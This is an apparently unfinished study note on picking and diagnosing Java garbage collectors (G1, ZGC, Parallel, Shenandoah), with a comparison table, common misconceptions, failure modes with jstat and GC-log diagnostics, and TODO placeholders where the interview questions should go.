**ONE-LINER:** "Start with G1 defaults, measure, switch to ZGC for latency or Parallel for batch"

**If you remember only 3 things:**

1. G1GC is the default and correct for 90% of applications - start here
2. ZGC for sub-millisecond pauses on any heap size (8GB-16TB)
3. Only tune AFTER picking the right algorithm - most tuning is unnecessary with modern GCs

**Interview one-liner:**
"I start with G1GC as the default, measure p99 latency and throughput, then switch to ZGC if I need sub-millisecond pauses for latency-sensitive services, or Parallel GC if I need maximum throughput for batch processing - I set -Xms equal to -Xmx and let the GC auto-tune before manual intervention."

---

### 💡 The Surprising Truth

[TODO: 2-4 sentences. One counterintuitive fact.
 Specific. Makes this concept permanently memorable.]

---

### 🎯 Interview Deep-Dive

**Q1: [TODO: Conceptual question - foundational]**

*Why they ask:* [TODO]

**Answer:**
[TODO: Complete structured answer. 200-500 words.]

---

**Q2: [TODO: Debugging/diagnosis scenario]**

*Why they ask:* [TODO]

**Answer:**
[TODO: Complete answer with diagnostic steps.]

---

**Q3: [TODO: Architecture/design question]**

*Why they ask:* [TODO]

**Answer:**
[TODO: Complete answer with design rationale.]

---

**Q4: [TODO: Trade-off decision question]**

*Why they ask:* [TODO]

**Answer:**
[TODO: Complete answer with decision framework.]

---

**Q5: [TODO: Production scenario question]**

*Why they ask:* [TODO]

**Answer:**
[TODO: Complete answer with metrics/remediation.]

---

### ⚖️ Comparison Table

| Aspect | G1 GC | ZGC | Parallel GC | Shenandoah |
|--------|-------|-----|------------|------------|
| Max pause | 200ms (target) | <1ms | Seconds | <10ms |
| Throughput | Good | Good (JDK 21+) | Best | Good |
| Min heap | ~4GB | ~256MB | Any | ~4GB |
| CPU overhead | Medium | Higher | Lowest | Higher |
| Default since | JDK 9 | No | JDK 1-8 | No |
| Best for | General purpose | Latency-critical | Batch | OpenJDK latency |

---

### ⚠️ Common Misconceptions

| # | Misconception | Reality |
|---|---------------|---------|
| 1 | G1 is always the best choice | G1 struggles with very large heaps (>64GB) where mixed collections can exceed pause targets. ZGC handles multi-terabyte heaps with sub-ms pauses. |
| 2 | ZGC has lower throughput than G1 | Since JDK 21, ZGC (generational mode) achieves throughput within 5% of G1 for most workloads while maintaining sub-ms pauses. |
| 3 | More GC tuning flags means better performance | Over-tuning creates fragile configurations that break when workload changes. Start with defaults, measure, and tune only the 2-3 most impactful parameters. |
| 4 | GC pause time = total application impact | GC impact includes: pause time + CPU stolen for concurrent work + allocation stalls + reference processing. Total GC overhead is more than pause time. |

---

### 🚨 Failure Modes and Diagnosis

**Failure Mode 1: Wrong GC for latency-sensitive service**
**Symptom:** p99 latency spikes of 200ms-2s correlated with GC pauses. SLA violations.
**Root Cause:** Using Parallel GC (stop-the-world for entire collection) for a latency-sensitive API service.
**Diagnostic:**

```
# Check which GC is active
java -XX:+PrintFlagsFinal -version 2>&1 | grep UseGC
# Check pause times
jstat -gcutil <pid> 1000
# GC logs: -Xlog:gc*:file=gc.log
```

**Fix:**
```java
// BAD: Parallel GC for API service
// -XX:+UseParallelGC (default on JDK 8)

// GOOD: G1 or ZGC for latency
// -XX:+UseG1GC -XX:MaxGCPauseMillis=100
// Or for sub-ms: -XX:+UseZGC
```
**Prevention:** Match GC to workload: ZGC for <10ms p99, G1 for <200ms, Parallel for batch only.

**Failure Mode 2: G1 mixed collection exceeding pause target**
**Symptom:** G1 pause times exceed `MaxGCPauseMillis` target. GC log shows long mixed collections.
**Root Cause:** Too much old-gen data to collect in one pause. G1 tries to collect too many regions in a mixed GC.
**Diagnostic:**

```
grep "Mixed" gc.log | awk '{print $NF}' | sort -n
# Show distribution of mixed collection pause times
# Tail values exceeding target = problem
```

**Fix:**
```java
// Reduce per-cycle collection work:
// -XX:G1MixedGCCountTarget=16 (default 8)
// Spread old-gen cleanup over more cycles

// Or: increase heap to reduce GC frequency
// -Xmx and -Xms should match for G1
```
**Prevention:** Set `-Xmx = -Xms` for G1. Monitor with `-Xlog:gc*`. Consider ZGC for heaps >32GB.

**Failure Mode 3: Allocation rate exceeding GC throughput**
**Symptom:** GC runs continuously. Application throughput drops to near zero. `jstat` shows constant GC activity.
**Root Cause:** Application allocates faster than any GC can reclaim. Young gen fills before GC completes.
**Diagnostic:**

```
jstat -gcutil <pid> 1000
# If S0/S1/E columns are always near 100%
# and GC time is >50% = allocation pressure

asprof -e alloc -d 30 -f alloc.html <pid>
# Shows which code paths allocate most
```

**Fix:**
```java
// 1. Profile allocations and reduce:
// - Reuse objects (StringBuilder, byte[])
// - Use primitives instead of wrappers
// - Cache computed values

// 2. Increase young gen size:
// -XX:NewRatio=2 or -Xmn for explicit sizing

// 3. If heap is full, increase -Xmx
```
**Prevention:** Profile allocation rate with async-profiler. Set allocation rate alerts. Size young gen to survive between GC cycles.

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**

- JVM Memory Model - understanding heap generations and object lifecycle
- JVM Profiling Tools - how to measure GC behavior and impact

**Builds on this (learn these next):**

- GC Tuning - advanced flag tuning for specific workloads
- JFR GC analysis - using Flight Recorder to diagnose GC issues

**Alternatives / Comparisons:**

- Manual memory management (Rust, C++) - no GC overhead but developer burden
- Off-heap storage (Chronicle, Memcached) - bypass GC for large data sets

